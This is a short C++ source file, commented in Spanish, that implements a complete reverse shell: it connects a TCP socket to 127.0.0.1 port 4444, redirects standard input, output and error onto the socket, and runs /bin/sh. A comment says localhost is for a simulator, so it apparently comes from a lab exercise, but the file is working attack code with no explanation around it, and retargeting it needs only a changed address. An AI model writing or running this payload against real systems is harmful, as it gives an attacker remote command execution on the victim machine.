#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sock;
    struct sockaddr_in server;
    
    // 1. Crear el socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    
    // 2. Configurar la dirección (Localhost para el simulador)
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(4444); // Puerto de escucha
    
    // 3. Conectar y redirigir entrada/salida a la shell
    connect(sock, (struct sockaddr *)&server, sizeof(server));
    for(int i = 0; i <= 2; i++) dup2(sock, i);
    
    // 4. Ejecutar la shell
    execve("/bin/sh", NULL, NULL);
    return 0;
}
